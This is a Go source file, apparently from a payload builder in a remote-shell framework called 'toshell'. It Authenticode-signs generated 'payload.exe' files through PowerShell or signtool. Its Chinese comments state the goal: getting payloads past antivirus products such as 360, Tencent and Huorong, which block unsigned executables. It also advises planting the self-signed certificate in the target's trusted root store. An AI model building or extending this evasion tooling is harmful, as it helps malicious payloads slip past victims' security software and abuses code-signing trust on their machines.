package builder

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"

	"toshell/internal/server/config"
	"toshell/internal/server/logging"
)

// ─── 构建后代码签名（Authenticode）────────────────────────────────────
//
// 为什么需要：在装有 360 安全卫士 / 腾讯电脑管家 / 火绒等国产安全软件的主机上，
// **新生成或未签名的 PE 往往在"创建进程"阶段就被拒绝执行，文件还会被删除**
// （实测：一个只有 time.Sleep 的 Hello-World Go 程序同样被拒，而微软签名的
// notepad.exe 副本可正常执行）。这属于"签名/信誉/策略"层拦截，改载荷代码无效。
//
// 签名不是免杀的银弹（杀软还会看云端信誉与运行时行为），但它是"能不能跑起来"
// 这一层的敲门砖，也是本仓库能力清单里最该补上的一环。
//
// 实现取舍：
//   - 优先用 Windows 自带的 PowerShell `Set-AuthenticodeSignature`（系统自带，无需装
//     Windows SDK）。pfx 密码通过**环境变量**传给子进程，**不出现在命令行里**
//     （命令行会被其它进程看到）。
//   - 若配置了证书指纹（从本机证书存储选证书）且找到了 signtool.exe，则用 signtool
//     签名（EV 证书/硬件令牌场景更标准），否则同样回退到 PowerShell。
//   - 服务端跑在非 Windows 上时不做签名（需要 Windows 的签名栈），返回明确说明。
//   - 签名后**重新读取磁盘产物**作为最终字节，保证接口返回的 size/sha256 与落盘文件一致。

// SignResult 一次签名的结果，供构建响应、日志与前端展示。
type SignResult struct {
	// Signed 签名是否成功（true 时产物已带有效 Authenticode 签名）
	Signed bool `json:"signed"`
	// Method 实际使用的签名方式：powershell / signtool / none
	Method string `json:"method"`
	// Signer 签名者主题（如 CN=xxx, O=yyy）；取不到时为空
	Signer string `json:"signer"`
	// Status 签名校验状态（Get-AuthenticodeSignature 的 Status，如 Valid/NotSigned/UnknownError）
	Status string `json:"status"`
	// Message 中文说明（失败原因/跳过的原因）
	Message string `json:"message"`
}

// SignConfig 解析后的签名配置（来自服务端配置 + 单次构建请求的覆盖开关）。
type SignConfig struct {
	Enabled      bool
	PFXPath      string
	PFXPassword  string
	Thumbprint   string
	TimestampURL string
	SigntoolPath string
	Description  string
	FailClosed   bool
}

// ResolveSignConfig 合并"服务端配置"与"本次构建请求的开关"。
// 请求只能**开启**（reqEnabled=true 时即使服务端默认关也签），不能关闭服务端已开启的签名。
func ResolveSignConfig(reqEnabled bool) SignConfig {
	cfg := config.Get()
	sc := SignConfig{}
	if cfg != nil {
		b := cfg.Builder
		sc = SignConfig{
			Enabled:      b.SignEnabled,
			PFXPath:      b.SignPFXPath,
			PFXPassword:  b.SignPFXPassword,
			Thumbprint:   b.SignThumbprint,
			TimestampURL: b.SignTimestampURL,
			SigntoolPath: b.SignSigntoolPath,
			Description:  b.SignDescription,
			FailClosed:   b.SignFailClosed,
		}
	}
	if reqEnabled {
		sc.Enabled = true
	}
	return sc
}

// configured 是否具备签名所需的最小配置（pfx 或指纹）。
func (s SignConfig) configured() bool {
	return strings.TrimSpace(s.PFXPath) != "" || strings.TrimSpace(s.Thumbprint) != ""
}

// isPE 粗判是否 Windows PE（MZ 头）。只用于决定"要不要尝试签名"。
func isPE(bin []byte) bool {
	return len(bin) > 0x40 && bin[0] == 'M' && bin[1] == 'Z'
}

// SignStatus 供前端/构建页展示签名能力：是否已配置、用的哪种证书、本机签名栈是否可用。
func (b *Builder) SignStatus() (configured bool, message string) {
	sc := ResolveSignConfig(false)
	switch {
	case !sc.Enabled && !sc.configured():
		return false, "未启用代码签名（设置 builder.sign_enabled / sign_pfx_path 或 sign_thumbprint 后生效）"
	case !sc.configured():
		return false, "已开启代码签名但未配置证书：请填 builder.sign_pfx_path(+密码) 或 builder.sign_thumbprint"
	case runtime.GOOS != "windows":
		return false, "已配置证书，但服务端不在 Windows 上：签名需要 Windows 的 signtool / Set-AuthenticodeSignature"
	default:
		mode := "证书文件(pfx)"
		if strings.TrimSpace(sc.PFXPath) == "" {
			mode = "证书存储指纹"
		}
		tool := "PowerShell Set-AuthenticodeSignature"
		if p := resolveSigntool(sc.SigntoolPath); p != "" {
			tool = "signtool（" + p + "）"
		}
		return true, fmt.Sprintf("已配置代码签名：%s，使用 %s", mode, tool)
	}
}

// signIfNeeded 在构建产物落盘前做签名：不满足条件时原样返回（nil 结果）。
// 返回的字节一定是"最终交付字节"（签名后从磁盘读回），保证 size/sha256 一致。
func (b *Builder) signIfNeeded(bin []byte, format string, reqEnabled bool) ([]byte, *SignResult, error) {
	sc := ResolveSignConfig(reqEnabled)
	if !sc.Enabled || !isPE(bin) {
		return bin, nil, nil
	}
	// shellcode 类格式本身不是 PE（就算 MZ 开头也不是要交付的可执行文件），不签
	switch strings.ToLower(format) {
	case "shellcode", "shellcode_bin", "shellcode_hex":
		return bin, nil, nil
	}
	if !sc.configured() {
		return bin, &SignResult{Signed: false, Method: "none", Message: "已开启签名但未配置证书（sign_pfx_path / sign_thumbprint）"}, nil
	}
	if runtime.GOOS != "windows" {
		return bin, &SignResult{Signed: false, Method: "none", Message: "服务端不在 Windows 上，无法签名（需要 Windows 的签名栈）"}, nil
	}

	signed, res, err := signPEBytes(bin, sc)
	if err != nil && sc.FailClosed {
		return bin, &res, fmt.Errorf("代码签名失败且 sign_fail_closed=true，已放弃该载荷：%v", err)
	}
	if err != nil {
		logging.Warn("builder", "代码签名失败（sign_fail_closed=false，返回未签名产物）：%v", err)
	}
	return signed, &res, nil
}

// signPEBytes 把 PE 字节写成临时文件 → 签名 → 读回。签名必须对磁盘文件做，
// 这是 signtool 与 Set-AuthenticodeSignature 共同的限制。
func signPEBytes(bin []byte, sc SignConfig) ([]byte, SignResult, error) {
	dir, err := os.MkdirTemp("", "toshell-sign-*")
	if err != nil {
		return bin, SignResult{Method: "none", Message: "创建临时目录失败"}, err
	}
	defer os.RemoveAll(dir)

	pePath := filepath.Join(dir, "payload.exe")
	if err := os.WriteFile(pePath, bin, 0644); err != nil {
		return bin, SignResult{Method: "none", Message: "写入待签名文件失败"}, err
	}

	method := "powershell"
	if tool := resolveSigntool(sc.SigntoolPath); tool != "" && strings.TrimSpace(sc.PFXPath) == "" && strings.TrimSpace(sc.Thumbprint) != "" {
		// 只有"从证书存储按指纹选证书"时才用 signtool：pfx+密码走 PowerShell，
		// 避免把证书密码放到命令行（命令行对同机其它进程可见）。
		method = "signtool"
		if err := signWithSigntool(tool, pePath, sc); err != nil {
			logging.Warn("builder", "signtool 签名失败，回退 PowerShell：%v", err)
			method = "powershell"
		}
	}
	if method == "powershell" {
		if err := signWithPowerShell(pePath, sc); err != nil {
			res := SignResult{Signed: false, Method: "powershell", Message: err.Error()}
			return bin, res, err
		}
	}

	out, err := os.ReadFile(pePath)
	if err != nil {
		return bin, SignResult{Method: method, Message: "读取签名后文件失败"}, err
	}
	// 复核签名（Get-AuthenticodeSignature 一定存在；失败也不影响产物，只影响结论展示）
	signer, status, verr := verifyWithPowerShell(pePath)
	res := SignResult{Method: method, Signer: signer, Status: status}
	switch {
	case status == "Valid":
		res.Signed = true
		res.Message = "签名成功且证书链受信任" + signerSuffix(signer)
	case status == "UnknownError" && strings.TrimSpace(signer) != "":
		// 这是自签名证书未导入受信任根时的正常状态：签名摘要匹配（文件确实被签了），
		// 只是证书链不受信任。实测本机自签名证书就是 "A certificate chain processed, but
		// terminated in a root certificate which is not trusted by the trust provider"。
		res.Signed = true
		res.Message = "已签名（签名者：" + signer + "），但证书链不受信任：需把该证书导入目标机的「受信任的根证书颁发机构」，复核算出的状态才会是 Valid"
	case verr != nil:
		res.Message = "签名后复核失败：" + verr.Error()
	default:
		res.Message = "签名后复核状态不是 Valid（Status=" + status + "），请检查证书是否受目标机信任"
	}
	return out, res, nil
}

func signerSuffix(signer string) string {
	if strings.TrimSpace(signer) == "" {
		return ""
	}
	return "，签名者：" + signer
}

// resolveSigntool 依次尝试：配置路径 → PATH → Windows SDK 常见安装目录。
func resolveSigntool(configured string) string {
	if p := strings.TrimSpace(configured); p != "" {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	if p, err := exec.LookPath("signtool"); err == nil {
		return p
	}
	if runtime.GOOS != "windows" {
		return ""
	}
	var candidates []string
	for _, root := range []string{os.Getenv("ProgramFiles(x86)"), os.Getenv("ProgramFiles")} {
		if root == "" {
			continue
		}
		kits := filepath.Join(root, "Windows Kits", "10", "bin")
		if entries, err := os.ReadDir(kits); err == nil {
			var versions []string
			for _, e := range entries {
				if e.IsDir() {
					versions = append(versions, e.Name())
				}
			}
			// 版本号从高到低，优先新 SDK
			sort.Sort(sort.Reverse(sort.StringSlice(versions)))
			for _, v := range versions {
				for _, arch := range []string{"x64", "x86"} {
					candidates = append(candidates, filepath.Join(kits, v, arch, "signtool.exe"))
				}
			}
		}
		candidates = append(candidates,
			filepath.Join(root, "Windows Kits", "8.1", "bin", "x64", "signtool.exe"),
		)
	}
	for _, c := range candidates {
		if st, err := os.Stat(c); err == nil && !st.IsDir() {
			return c
		}
	}
	return ""
}

// signWithSigntool 用 signtool 签名。
// 只在"证书存储指纹"模式调用：pfx+密码模式一律走 PowerShell，避免证书密码进命令行。
func signWithSigntool(tool, pePath string, sc SignConfig) error {
	thumb := normalizeThumbprint(sc.Thumbprint)
	if thumb == "" {
		return fmt.Errorf("signtool 模式需要证书指纹（sign_thumbprint）")
	}
	args := []string{"sign", "/fd", "sha256", "/sha1", thumb}
	if d := strings.TrimSpace(sc.Description); d != "" {
		args = append(args, "/d", d)
	}
	if ts := strings.TrimSpace(sc.TimestampURL); ts != "" {
		args = append(args, "/tr", ts, "/td", "sha256")
	}
	args = append(args, pePath)

	cmd := exec.Command(tool, args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("signtool 失败：%v（输出：%s）", err, trimOutput(out))
	}
	// verify 只是复核，失败不当作签名失败（自签名证书在未导入受信任根时 verify 会失败）
	verify := exec.Command(tool, "verify", "/pa", pePath)
	if vout, verr := verify.CombinedOutput(); verr != nil {
		logging.Warn("builder", "signtool verify 未通过（自签名证书需导入受信任根才为 Valid）：%s", trimOutput(vout))
	}
	return nil
}

func normalizeThumbprint(t string) string {
	t = strings.TrimSpace(t)
	t = strings.ReplaceAll(t, " ", "")
	t = strings.ReplaceAll(t, ":", "")
	return strings.ToUpper(t)
}

// signWithPowerShell 用系统自带的 Set-AuthenticodeSignature 签名。
// 证书路径/密码/指纹/时间戳地址都通过**环境变量**传给子进程：密码不进命令行。
func signWithPowerShell(pePath string, sc SignConfig) error {
	script := `
$ErrorActionPreference = 'Stop'
$file = $env:TSH_SIGN_FILE
if ($env:TSH_SIGN_PFX -ne '') {
    # 注意：Windows PowerShell 5.1 的 Get-PfxCertificate **没有 -Password 参数**
    # （实测报"找不到与参数名称 Password 匹配的参数"），因此改用 X509Certificate2
    # 构造函数带密码加载 pfx —— PS 5.1 与 7 都可用。
    $flags = [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($env:TSH_SIGN_PFX, $env:TSH_SIGN_PFX_PW, $flags)
    if ($null -eq $cert) { throw "加载 pfx 失败：$env:TSH_SIGN_PFX" }
    if (-not $cert.HasPrivateKey) { throw "pfx 中没有私钥（密码错误或导出时未包含私钥），无法签名" }
} else {
    $thumb = $env:TSH_SIGN_THUMB
    $cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.Thumbprint -eq $thumb } | Select-Object -First 1
    if (-not $cert) { throw "证书存储 CurrentUser\My 里找不到指纹 $thumb 的证书" }
}
$params = @{ FilePath = $file; Certificate = $cert; HashAlgorithm = 'SHA256' }
if ($env:TSH_SIGN_TS -ne '') { $params['TimestampServer'] = $env:TSH_SIGN_TS }
$r = Set-AuthenticodeSignature @params
if ($r.Status -ne 'Valid' -and $r.Status -ne 'UnknownError') {
    throw ("Set-AuthenticodeSignature 返回 " + $r.Status + "：" + $r.StatusMessage)
}
Write-Output $r.Status
`
	return runPowerShell(script, map[string]string{
		"TSH_SIGN_FILE":   pePath,
		"TSH_SIGN_PFX":    sc.PFXPath,
		"TSH_SIGN_PFX_PW": sc.PFXPassword,
		"TSH_SIGN_THUMB":  normalizeThumbprint(sc.Thumbprint),
		"TSH_SIGN_TS":     strings.TrimSpace(sc.TimestampURL),
	})
}

// verifyWithPowerShell 复核签名，返回 (签名者主题, Status, 错误)。
func verifyWithPowerShell(pePath string) (string, string, error) {
	script := `
$ErrorActionPreference = 'Stop'
$r = Get-AuthenticodeSignature -FilePath $env:TSH_SIGN_FILE
$signer = ''
if ($r.SignerCertificate) { $signer = $r.SignerCertificate.Subject }
[pscustomobject]@{ Status = [string]$r.Status; Signer = $signer } | ConvertTo-Json -Compress
`
	out, err := runPowerShellOutput(script, map[string]string{"TSH_SIGN_FILE": pePath})
	if err != nil {
		return "", "UnknownError", err
	}
	var parsed struct {
		Status string `json:"Status"`
		Signer string `json:"Signer"`
	}
	if err := json.Unmarshal([]byte(strings.TrimSpace(out)), &parsed); err != nil {
		return "", "UnknownError", fmt.Errorf("解析签名复核结果失败：%v（输出：%s）", err, trimOutput([]byte(out)))
	}
	return parsed.Signer, parsed.Status, nil
}

// runPowerShell 执行一段 PowerShell（不关心输出）。
func runPowerShell(script string, env map[string]string) error {
	_, err := runPowerShellOutput(script, env)
	return err
}

// runPowerShellOutput 执行一段 PowerShell 并返回 stdout。
// 密码等敏感值一律走环境变量，避免出现在命令行（同机其它进程可见）。
func runPowerShellOutput(script string, env map[string]string) (string, error) {
	shell := "powershell"
	if _, err := exec.LookPath(shell); err != nil {
		if p, err2 := exec.LookPath("pwsh"); err2 == nil {
			shell = p
		} else {
			return "", fmt.Errorf("找不到 powershell/pwsh，无法调用 Windows 签名栈")
		}
	}
	cmd := exec.Command(shell, "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script)
	cmd.Env = os.Environ()
	for k, v := range env {
		cmd.Env = append(cmd.Env, k+"="+v)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), fmt.Errorf("PowerShell 调用失败：%v（输出：%s）", err, trimOutput(out))
	}
	return string(out), nil
}

// trimOutput 截断外部命令输出，避免把整篇日志塞进响应/日志行。
func trimOutput(b []byte) string {
	s := strings.TrimSpace(string(b))
	if len(s) > 400 {
		return s[:400] + "…"
	}
	return s
}
